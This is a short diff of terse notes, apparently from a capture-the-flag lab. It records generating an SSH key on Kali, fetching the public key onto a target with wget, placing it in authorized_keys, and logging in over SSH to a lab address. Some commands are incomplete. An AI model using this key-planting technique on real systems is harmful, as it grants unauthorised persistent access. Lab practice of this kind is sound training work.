@@ -1,0 +1,12 @@
+mkdir .ssh
+cd .ssh
+
+on Kali:
+make key
+ssh-keygen -f matt
+chmod 600 matt
+
+
+wget matt.pub
+ mv authorized_keys
+ ssh -i matt matt@10.10.11.136
